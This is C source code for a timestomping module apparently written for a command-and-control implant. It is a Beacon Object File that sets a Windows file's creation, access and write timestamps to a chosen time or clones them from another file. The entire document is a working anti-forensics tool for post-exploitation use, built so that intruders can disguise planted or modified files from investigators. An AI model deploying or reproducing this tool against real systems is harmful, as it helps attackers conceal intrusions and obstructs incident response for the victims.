/*
 * bof-timestomp <path> [timestamp | copy <source>]
 *
 * Overwrite a file's $STANDARD_INFORMATION timestamps with SetFileTime.
 * Accepted timestamps:
 *   "YYYY-MM-DD HH:MM:SS"   (local time)
 *   "YYYY-MM-DDTHH:MM:SS"
 *   "YYYYMMDDHHMMSS"
 *   copy <source>           (clone all three times from another file)
 * With no timestamp the current local time is used.
 *
 * Note: this changes the user-visible timestamps; $FILE_NAME times in the
 * MFT can still differ (use a kernel-level tool for that).
 */
#include "beacon.h"
#include "bofdefs.h"
#include "helpers.h"

static int grab_int(const char **p, int n)
{
    int v = 0, i;
    for (i = 0; i < n; i++) {
        if (**p < '0' || **p > '9') return -1;
        v = v * 10 + (**p - '0');
        (*p)++;
    }
    return v;
}

static int parse_time(const char *s, SYSTEMTIME *st)
{
    int y, mo, d, h = 0, mi = 0, se = 0;
    const char *p = s;

    y = grab_int(&p, 4);
    if (y < 0) return -1;
    if (*p == '-') p++;
    mo = grab_int(&p, 2);
    if (mo < 0) return -1;
    if (*p == '-') p++;
    d = grab_int(&p, 2);
    if (d < 0) return -1;

    if (*p && *p != ' ' && *p != 'T') {
        /* YYYYMMDDHHMMSS */
        if (*p) {
            h = grab_int(&p, 2);
            if (h < 0) return -1;
            mi = grab_int(&p, 2);
            if (mi < 0) return -1;
            se = grab_int(&p, 2);
            if (se < 0) return -1;
        }
    } else if (*p) {
        p++;
        h = grab_int(&p, 2);
        if (h < 0) return -1;
        if (*p == ':') p++;
        mi = grab_int(&p, 2);
        if (mi < 0) return -1;
        if (*p == ':') p++;
        se = grab_int(&p, 2);
        if (se < 0) return -1;
    }

    if (y < 1601 || mo < 1 || mo > 12 || d < 1 || d > 31 ||
        h > 23 || mi > 59 || se > 59)
        return -1;

    bof_memzero(st, sizeof(*st));
    st->wYear = (WORD)y;
    st->wMonth = (WORD)mo;
    st->wDay = (WORD)d;
    st->wHour = (WORD)h;
    st->wMinute = (WORD)mi;
    st->wSecond = (WORD)se;
    return 0;
}

static void show_times(const char *label, HANDLE h)
{
    FILETIME c, a, w;
    char s[32];

    if (!KERNEL32$GetFileTime(h, &c, &a, &w)) return;
    bof_ft_str(((unsigned long long)w.dwHighDateTime << 32) | w.dwLowDateTime,
               s, sizeof(s));
    BeaconPrintf(CALLBACK_OUTPUT, "  %s write: %s\n", label, s);
}

void go(char *args, int alen)
{
    datap parser;
    char *path, *ts = "", *maybe_copy = "";
    int plen = 0, tlen = 0, mlen = 0;
    HANDLE h, src;
    FILETIME c, a, w;
    SYSTEMTIME st;
    int copying = 0;

    BeaconDataParse(&parser, args, alen);
    path = BeaconDataExtract(&parser, &plen);
    ts   = BeaconDataExtract(&parser, &tlen);
    maybe_copy = BeaconDataExtract(&parser, &mlen);
    if (!path || !path[0]) {
        BeaconPrintf(CALLBACK_ERROR,
                     "usage: timestomp <path> [timestamp | copy <source>]\n");
        return;
    }
    if (!ts) ts = "";
    if (!maybe_copy) maybe_copy = "";

    if (bof_stricmp(ts, "copy") == 0) copying = 1;

    h = KERNEL32$CreateFileA(path, FILE_WRITE_ATTRIBUTES,
                             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
                             NULL, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, NULL);
    if (h == INVALID_HANDLE_VALUE) {
        BeaconPrintf(CALLBACK_ERROR, "open %s failed: %lu\n", path,
                     (unsigned long)KERNEL32$GetLastError());
        return;
    }

    show_times("before", h);

    if (copying) {
        if (!maybe_copy[0]) {
            BeaconPrintf(CALLBACK_ERROR, "copy needs a source file\n");
            KERNEL32$CloseHandle(h);
            return;
        }
        src = KERNEL32$CreateFileA(maybe_copy, GENERIC_READ,
                                   FILE_SHARE_READ | FILE_SHARE_WRITE |
                                   FILE_SHARE_DELETE, NULL, OPEN_EXISTING, 0, NULL);
        if (src == INVALID_HANDLE_VALUE) {
            BeaconPrintf(CALLBACK_ERROR, "open source %s failed: %lu\n",
                         maybe_copy, (unsigned long)KERNEL32$GetLastError());
            KERNEL32$CloseHandle(h);
            return;
        }
        if (!KERNEL32$GetFileTime(src, &c, &a, &w)) {
            BeaconPrintf(CALLBACK_ERROR, "GetFileTime(source) failed\n");
            KERNEL32$CloseHandle(src);
            KERNEL32$CloseHandle(h);
            return;
        }
        KERNEL32$CloseHandle(src);
    } else {
        if (ts[0]) {
            if (parse_time(ts, &st) != 0) {
                BeaconPrintf(CALLBACK_ERROR,
                             "bad timestamp '%s' (use YYYY-MM-DD HH:MM:SS)\n", ts);
                KERNEL32$CloseHandle(h);
                return;
            }
        } else {
            KERNEL32$GetLocalTime(&st);
        }
        if (!KERNEL32$SystemTimeToFileTime(&st, &w)) {
            BeaconPrintf(CALLBACK_ERROR, "SystemTimeToFileTime failed\n");
            KERNEL32$CloseHandle(h);
            return;
        }
        if (!KERNEL32$LocalFileTimeToFileTime(&w, &w)) {
            BeaconPrintf(CALLBACK_ERROR, "LocalFileTimeToFileTime failed\n");
            KERNEL32$CloseHandle(h);
            return;
        }
        c = w;
        a = w;
    }

    if (KERNEL32$SetFileTime(h, &c, &a, &w)) {
        BeaconPrintf(CALLBACK_OUTPUT, "[+] timestamps updated on %s\n", path);
        show_times("after ", h);
    } else {
        BeaconPrintf(CALLBACK_ERROR, "SetFileTime failed: %lu\n",
                     (unsigned long)KERNEL32$GetLastError());
    }

    KERNEL32$CloseHandle(h);
}
